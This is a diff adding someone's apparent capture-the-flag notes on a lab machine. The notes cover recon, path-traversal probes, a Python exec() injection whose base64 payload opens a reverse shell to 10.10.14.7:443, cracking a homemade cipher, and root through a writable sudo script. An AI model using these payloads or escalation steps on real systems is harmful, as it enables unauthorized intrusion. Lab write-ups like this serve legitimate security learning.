@@ -1,0 +1,58 @@
+# Recon
+## comm tcp
+
+## all tcp
+22/tcp   open   ssh        OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+80/tcp   closed
+8080/tcp open   http-proxy BadHTTPServer
+9000/tcp closed cslistener
+
+Reporting closed, maybe port-knocking (?)
+
+# Enum
+## 8080
+webpage, mentoned obscure.htb, update /etc/hosts
+"Message to server devs: the current source code for the web server is in 'SuperSecureServer.py' in the secret development directory"
+
+gobuster has some troubles. Use dirbuster and wfuzz instead, nothing
+
+tried post, can take, but no difference.
+
+(get hint) since we have filename, try fuzz /FUZZ/SuperSecureServer.py => /develop/SuperSecureServer.py
+try ../../../../../etc/passwd and ../../../../notexist/etc/passwd, if different, has dir traversal issue.
+
+rtfsc => lint 140, exec(); 
+looks like space is not allowed and maybe url encoding will fail to exec.
+local test, fix issues and find this works =>
+/index.html';exec(__import__('base64').b64decode("aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoIjEwLjEwLjE0LjciLDQ0MykpO29zLmR1cDIocy5maWxlbm8oKSwwKTsgb3MuZHVwMihzLmZpbGVubygpLDEpOyBvcy5kdXAyKHMuZmlsZW5vKCksMik7cD1zdWJwcm9jZXNzLmNhbGwoWyIvYmluL3NoIiwiLWkiXSk7Cg=="));a='
+
+get foothold
+
+# Priv Esc
+## Get robert
+find user /home/robert, files:
+check.txt => 
+"Encrypting this file with your key should result in out.txt, make sure your key is correct!"
+out.txt, passwordreminder.txt, two binary files.
+=> maybe brute forcing the key according two this two files.
+
+also find /home/robert/BetterSSH/BetterSSH.py.
+
+Somehow now the port 22 is open.
+
+find /var/SuperSecureServer/, robert somehow can change its main.py, and root is running the keepalive.sh which uses main.py
+possible priv esc path (?).
+
+xxd the out.txt and passwordreminder.txt, every two bytes starts with c2 or c3. and last one is not.
+
+I am blind! The SuperSecureCrypt.py on the desktop is not SuperSecureServer.py!! It was right in front of me!
+rtfsc + bf => key is alexandrovich
+
+used it decrypt passwordreminder.txt => SecThruObsFTW
+
+ssh failed but su robert ok.
+
+## Get Root
+Looks like BetterSSH is own by root, but since we have robert's home dir, we can move it somewhere and create our own.
+sudo -l => we can sudo BetterSSH.py
+=> root
